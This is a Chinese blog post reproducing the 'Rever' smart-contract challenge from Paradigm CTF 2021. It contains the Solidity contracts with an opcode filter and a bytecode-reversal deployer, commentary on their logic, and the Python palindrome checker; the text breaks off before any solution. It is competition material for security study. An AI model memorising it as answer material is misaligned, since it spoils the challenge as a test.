{"title":"Paradigm CTF 2021","uid":"e4a055270fc77b5d73f92a425173cb60","slug":"Paradigm  CTF 2021","date":"2022-10-15T12:42:45.830Z","updated":"2022-12-05T18:19:44.978Z","comments":true,"path":"api/articles/Paradigm  CTF 2021.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/CTF.c4f7e58a.png","content":"<p>由于团队的需要，需要复现一下Paradigm CTF 2021。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-Rever\"><a href=\"#1-Rever\" class=\"headerlink\" title=\"1.Rever\"></a>1.Rever</h1><h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Deployer</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> code<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Challenge</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> fwd<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> rev<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> code<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> code<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">uint8</span> op <span class=\"token operator\">=</span> <span class=\"token builtin\">uint8</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>\n                   op <span class=\"token operator\">==</span> <span class=\"token number\">0x3B</span> <span class=\"token comment\">// EXTCODECOPY</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x3C</span> <span class=\"token comment\">// EXTCODESIZE</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x3F</span> <span class=\"token comment\">// EXTCODEHASH</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x54</span> <span class=\"token comment\">// SLOAD</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x55</span> <span class=\"token comment\">// SSTORE</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF0</span> <span class=\"token comment\">// CREATE</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF1</span> <span class=\"token comment\">// CALL</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF2</span> <span class=\"token comment\">// CALLCODE</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF4</span> <span class=\"token comment\">// DELEGATECALL</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF5</span> <span class=\"token comment\">// CREATE2</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xFA</span> <span class=\"token comment\">// STATICCALL</span>\n                <span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xFF</span> <span class=\"token comment\">// SELFDESTRUCT</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            \n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>op <span class=\"token operator\">>=</span> <span class=\"token number\">0x60</span> <span class=\"token operator\">&amp;&amp;</span> op <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> i <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>op <span class=\"token operator\">-</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            \n            i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        \n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> b <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">bytes</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> a<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            b<span class=\"token punctuation\">[</span>b<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deployOne</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> code<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">101</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"deployOne/code-too-long\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">safe</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"deployOne/code-unsafe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Deployer</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> code<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span>  <span class=\"token punctuation\">&#123;</span>\n        fwd <span class=\"token operator\">=</span> <span class=\"token function\">deployOne</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rev <span class=\"token operator\">=</span> <span class=\"token function\">deployOne</span><span class=\"token punctuation\">(</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Setup</span> <span class=\"token punctuation\">&#123;</span>\n    Challenge <span class=\"token keyword\">public</span> challenge<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        challenge <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Challenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> what<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>challenge<span class=\"token punctuation\">.</span><span class=\"token function\">fwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> what<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>challenge<span class=\"token punctuation\">.</span><span class=\"token function\">rev</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> what<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> who<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> what<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">bool</span> ok<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            ok <span class=\"token operator\">:=</span> <span class=\"token function\">staticcall</span><span class=\"token punctuation\">(</span><span class=\"token function\">gas</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> who<span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>what<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>what<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> ok <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token function\">iszero</span><span class=\"token punctuation\">(</span><span class=\"token function\">iszero</span><span class=\"token punctuation\">(</span><span class=\"token function\">returndatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">let</span> ptr <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">returndatacopy</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token function\">returndatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    ok <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> ok<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse\"><a href=\"#Analyse\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>做出这道题需要对汇编知识有些理解</p>\n<p>我们首先对题目合约进行分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221011142240846.png\"></p>\n<p>梳理一下思路来看，challenge合约中deploy函数创建deployer合约，获得合约地址，并且调用safe函数对于创建时传入的bytecode进行判断，限制,部署的合约不应含有以下功能</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">op <span class=\"token operator\">==</span> <span class=\"token number\">0x3B</span> <span class=\"token comment\">// EXTCODECOPY</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x3C</span> <span class=\"token comment\">// EXTCODESIZE</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x3F</span> <span class=\"token comment\">// EXTCODEHASH</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x54</span> <span class=\"token comment\">// SLOAD</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0x55</span> <span class=\"token comment\">// SSTORE</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF0</span> <span class=\"token comment\">// CREATE</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF1</span> <span class=\"token comment\">// CALL</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF2</span> <span class=\"token comment\">// CALLCODE</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF4</span> <span class=\"token comment\">// DELEGATECALL</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xF5</span> <span class=\"token comment\">// CREATE2</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xFA</span> <span class=\"token comment\">// STATICCALL</span>\n<span class=\"token operator\">||</span> op <span class=\"token operator\">==</span> <span class=\"token number\">0xFF</span> <span class=\"token comment\">// SELFDESTRUCT</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>deploy函数被调用时会部署两个合约，<code>fwd</code>地址为以<code>code</code>部署的合约地址，<code>rev</code>是以<code>reversed(list(code))</code>部署的合约地址，其中<code>flip</code>函数就是将code进行倒序（以字节为单位）</p>\n<p>比如0x1234567890—&gt;0x9078563412</p>\n<p>Setup合约会调用<code>fwd</code>，<code>rev</code>合约，<code>calldata</code>为mload(0x160,0x160+string.length)，之后进行判断<code>returndatasize</code>是否非空，是则执行if，否则直接返回false</p>\n<p>if中执行内容为将指针移动到mload(0x40)，并且将returndata拷贝到ptr中，读取mload(ptr)的值作为返回值。关于mload(0x40)我们可以看下边这一段解释</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p> <strong>As others pointed out, the <code>mload(0x40) </code>returns where the pointer addresses that you can start using it. (free-pointer)</strong></p>\n<p><strong>The first four 32 bytes (128) are always reserved when your smart contract is deployed. This is the reason your <code>mload(0x40)</code> returns 80. 80 is represented in hex format. It is 128 in decimal, which is where you can start writing in memory! This is how the memory looks like currently.</strong></p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/W0BPj.png\"></p>\n<p>目前合约部分分析完成，再来看一下python代码部分</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> eth_sandbox\n<span class=\"token keyword\">from</span> weakref <span class=\"token keyword\">import</span> WeakKeyDictionary\n<span class=\"token keyword\">import</span> web3\n<span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3\n<span class=\"token keyword\">from</span> eth_abi <span class=\"token keyword\">import</span> encode_single\n<span class=\"token keyword\">import</span> random\n<span class=\"token keyword\">import</span> string\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">random_string</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_uppercase <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">checker</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> web3<span class=\"token punctuation\">:</span> Web3<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">:</span>\n    testcases <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"ab\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"aba\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"paradigm\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"tattarrattat\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> i <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0.5</span><span class=\"token punctuation\">:</span>\n                <span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> random_string<span class=\"token punctuation\">(</span><span class=\"token number\">63</span><span class=\"token punctuation\">)</span>\n                testcases<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span> <span class=\"token operator\">+</span> random_string<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> random_string<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span>\n                testcases<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span> <span class=\"token operator\">+</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            testcases<span class=\"token punctuation\">[</span>random_string<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n\n    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> testcases<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        data <span class=\"token operator\">=</span> web3<span class=\"token punctuation\">.</span>sha3<span class=\"token punctuation\">(</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"test(string)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> encode_single<span class=\"token punctuation\">(</span><span class=\"token string\">'uint256'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> encode_single<span class=\"token punctuation\">(</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span>\n        result <span class=\"token operator\">=</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">(</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token string\">\"to\"</span><span class=\"token punctuation\">:</span> addr<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span> data<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> v<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n    \n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n\neth_sandbox<span class=\"token punctuation\">.</span>run_launcher<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>\n    eth_sandbox<span class=\"token punctuation\">.</span>new_launch_instance_action<span class=\"token punctuation\">(</span>deploy_value<span class=\"token operator\">=</span>Web3<span class=\"token punctuation\">.</span>toWei<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ether'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    eth_sandbox<span class=\"token punctuation\">.</span>new_get_flag_action<span class=\"token punctuation\">(</span>checker<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" 